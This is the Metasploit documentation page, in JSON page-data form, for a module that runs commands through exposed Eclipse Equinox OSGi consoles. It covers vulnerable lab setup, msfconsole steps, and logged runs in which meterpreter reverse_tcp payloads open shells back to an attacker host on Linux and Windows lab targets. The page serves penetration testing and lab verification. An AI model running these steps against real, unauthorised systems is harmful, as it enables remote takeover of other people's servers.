{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/osgi_console_exec","result":{"data":{"moduleMetadataJson":{"id":"c81f628a-1904-58e1-b96c-22d5e5c2b87f","name":"Eclipse Equinoxe OSGi Console Command Execution","fullname":"exploit/multi/misc/osgi_console_exec","description":"Exploit Eclipse Equinoxe OSGi (Open Service Gateway initiative) console\n        'fork' command to execute arbitrary commands on the remote system..","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/osgi_console_exec","documentationSlug":"/modules/documentation/exploit/multi/misc/osgi_console_exec","referencesSlug":"/modules/references/exploit/multi/misc/osgi_console_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module takes advantage of OSGi consoles exposed by some Java-based middleware servers.</p>\n<p>The OSGi console is a telnet-based server that can be used for remote debugging and dynamic loading/removal of Java bundles running on an OSGi based server.</p>\n<h3 id=\"test-setup\" style=\"position:relative;\"><a href=\"#test-setup\" aria-label=\"test setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test setup</h3>\n<h4 id=\"linux-environment\" style=\"position:relative;\"><a href=\"#linux-environment\" aria-label=\"linux environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Linux environment</h4>\n<p>Follow these steps to run the vulnerable application on a Linux host:</p>\n<ol>\n<li>Create a test environment directory\n<code class=\"language-text\">mkdir testenv &amp;&amp; cd testenv</code></li>\n<li>Download the setup script\n<code class=\"language-text\">wget https://gist.githubusercontent.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a/raw/e098f6ea31717311bd6ce5b3be94744dddfc2388/setup.sh</code></li>\n<li>Set appropriate permission\n<code class=\"language-text\">chmod +x setup.sh</code></li>\n<li>Execute setup script\n<code class=\"language-text\">./setup.sh</code></li>\n<li>Launch the vulnerable application with this command so it listens on port TCP/5555\n<code class=\"language-text\">java -jar org.eclipse.osgi.jar -console 5555</code></li>\n<li>Verify that the server is running, you should be prompted with <code class=\"language-text\">osgi&gt;</code>\n<code class=\"language-text\">telnet localhost 5555</code></li>\n<li>From the telnet console, enable the second second server. This one listens on port 2019 by default. Set the IP to an address linked to an external interface if attacker machine is on another host.\n<code class=\"language-text\">telnetd --ip=127.0.0.1 start</code></li>\n</ol>\n<h4 id=\"windows-environment\" style=\"position:relative;\"><a href=\"#windows-environment\" aria-label=\"windows environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows environment</h4>\n<p>Follow these steps to run the vulnerable application on a Windows host:</p>\n<ol>\n<li>Download the Eclipse Equinoxe SDK from <a href=\"https://www.eclipse.org/downloads/download.php?file=/equinox/drops/R-Oxygen.2-201711300510/equinox-SDK-Oxygen.2.zip&#x26;r=1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.eclipse.org/downloads/download.php?file=/equinox/drops/R-Oxygen.2-201711300510/equinox-SDK-Oxygen.2.zip&#x26;r=1</a></li>\n<li>Create a test directory. Let's name it <code class=\"language-text\">osgi_test</code> for clarity.</li>\n<li>Create a directory named <code class=\"language-text\">configuration</code> in <code class=\"language-text\">osgi_test</code></li>\n<li>\n<p>Create a file named <code class=\"language-text\">config.ini</code> in your <code class=\"language-text\">configuration</code> directory. The file should contain the following lines only:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">osgi.bundles=org.eclipse.equinox.console@start, org.apache.felix.gogo.command@start, org.apache.felix.gogo.shell@start, org.apache.felix.gogo.runtime@start\neclipse.ignoreApp=true\nosgi.noShutdown=true</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Create an empty <code class=\"language-text\">plugins</code> directory in <code class=\"language-text\">osgi_test</code> directory</li>\n<li>Extract <code class=\"language-text\">plugins/org.apache.felix.gogo.command_(version).jar</code> from the SDK as <code class=\"language-text\">org.apache.felix.gogo.command.jar</code> in <code class=\"language-text\">osgi_test</code> directory. </li>\n<li>Extract <code class=\"language-text\">plugins/org.apache.felix.gogo.runtime_(version).jar</code> from the SDK as <code class=\"language-text\">org.apache.felix.gogo.runtime.jar</code> in <code class=\"language-text\">osgi_test</code> directory.</li>\n<li>Extract <code class=\"language-text\">plugins/org.apache.felix.gogo.shell_(version).jar</code> from the SDK as <code class=\"language-text\">org.apache.felix.gogo.shell.jar</code> in <code class=\"language-text\">osgi_test</code> directory.</li>\n<li>Extract <code class=\"language-text\">plugins/org.eclipse.equinox.console_(version).jar</code> from the SDK as <code class=\"language-text\">org.eclipse.equinox.console.jar</code> in <code class=\"language-text\">osgi_test</code> directory.</li>\n<li>Extract <code class=\"language-text\">plugins/org.eclipse.osgi_(version).jar</code> from the SDK as <code class=\"language-text\">org.eclipse.osgi.jar</code> in <code class=\"language-text\">osgi_test</code> directory.</li>\n<li>\n<p>At the end of those steps, your <code class=\"language-text\">osgi_test</code> directory should contain the following items:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">.\n├── configuration\n│   └── config.ini\n├── org.apache.felix.gogo.command.jar\n├── org.apache.felix.gogo.runtime.jar\n├── org.apache.felix.gogo.shell.jar\n├── org.eclipse.equinox.console.jar\n├── org.eclipse.osgi.jar\n└── plugins</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Launch the vulnerable application with this command so it listens on port TCP/5555\n<code class=\"language-text\">java -jar org.eclipse.osgi.jar -console 5555</code></li>\n<li>Verify that the server is running, you should be prompted with <code class=\"language-text\">osgi&gt;</code>\n<code class=\"language-text\">telnet localhost 5555</code></li>\n<li>From the telnet console, enable the second second server. This one listens on port 2019 by default. Set the IP to an address linked to an external interface if attacker machine is on another host.\n<code class=\"language-text\">telnetd --ip=127.0.0.1 start</code></li>\n</ol>\n<p>If you don't want to go through all those steps manually I recommend you to run the setup script on a Linux host, mount the directory on a Windows VM and start from step 11.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>You can verify the module against the vulnerable application with those steps:</p>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/misc/osgi_console_exec</code></li>\n<li>Do: <code class=\"language-text\">set RHOST 127.0.0.1</code></li>\n<li>Do: <code class=\"language-text\">set RPORT 5555</code> or <code class=\"language-text\">set RPORT 2019</code></li>\n<li>Do: <code class=\"language-text\">check</code>. The target should appear vulnerable.</li>\n<li>Do: <code class=\"language-text\">set payload</code> with the payload of your choosing.</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TIME_WAIT</strong> - Time to wait for payload to be executed. The default value is set to 20 seconds.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"reverse-shell-on-linux-host\" style=\"position:relative;\"><a href=\"#reverse-shell-on-linux-host\" aria-label=\"reverse shell on linux host permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reverse shell on Linux host</h3>\n<p>Exploit running against a Ubuntu Linux target:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/osgi_console_exec\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set RHOST 172.20.10.4\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set RPORT 5555\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set TARGET 0\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set payload linux/x86/meterpreter/reverse_tcp\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set LHOST 172.20.10.2\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set LPORT 4444\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; run\n[*] Exploit running as background job 1.\n[*] Started reverse TCP handler on 172.20.10.2:4444\n[*] 172.20.10.4:5555 - Accessing the OSGi console ...\n[*] 172.20.10.4:5555 - Exploiting...\n[*] Sending stage (857352 bytes) to 172.20.10.4\n[*] 172.20.10.4:5555 - 172.20.10.4:5555 - Waiting for session...\n[*] Meterpreter session 2 opened (172.20.10.2:4444 -&gt; 172.20.10.4:39314) at 2018-02-14 19:17:39 +0100\n[*] 172.20.10.4:5555 - Command Stager progress - 100.00% done (763/763 bytes)\n\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter &gt; sysinfo\nComputer     : 172.20.10.4\nOS           : Ubuntu 16.04 (Linux 4.4.0-38-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"reverse-shell-on-windows-host\" style=\"position:relative;\"><a href=\"#reverse-shell-on-windows-host\" aria-label=\"reverse shell on windows host permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reverse shell on Windows host</h3>\n<p>Exploit running against a Windows 7 target:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/misc/osgi_console_exec\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set RHOST 172.20.10.3\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set RPORT 5555\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set TARGET 1\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set payload windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set LHOST 172.20.10.2\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; set LPORT 4444\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; run\n[*] Exploit running as background job 2.\n[*] Started reverse TCP handler on 172.20.10.2:4444\n[*] 172.20.10.3:5555 - Accessing the OSGi console ...\n[*] 172.20.10.3:5555 - Exploiting...\n[*] 172.20.10.3:5555 - 172.20.10.3:5555 - Waiting for session...\n[*] Sending stage (179779 bytes) to 172.20.10.3\n[*] Meterpreter session 1 opened (172.20.10.2:4444 -&gt; 172.20.10.3:49365) at 2018-02-14 19:14:15 +0100\nmsf5 exploit(multi/misc/osgi_console_exec) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : PENTEST-PC\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c81f628a-1904-58e1-b96c-22d5e5c2b87f"}}}